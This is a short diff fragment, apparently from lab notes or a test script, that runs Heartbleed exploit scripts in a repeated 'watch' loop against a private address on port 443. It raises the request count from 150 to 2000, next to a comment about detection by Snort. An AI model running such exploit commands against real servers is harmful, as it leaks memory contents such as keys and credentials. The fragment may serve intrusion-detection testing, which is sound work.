@@ -140,7 +140,7 @@ watch sudo python exploit.python 192.168.1.49 -p 443
 #10.10.3.155
 
 #### be detected by snort in less 2 mins
-watch sudo python heartbleed.py 192.168.1.49 -p 443 -n 150
+watch sudo python heartbleed.py 192.168.1.49 -p 443 -n 2000
 
 
 
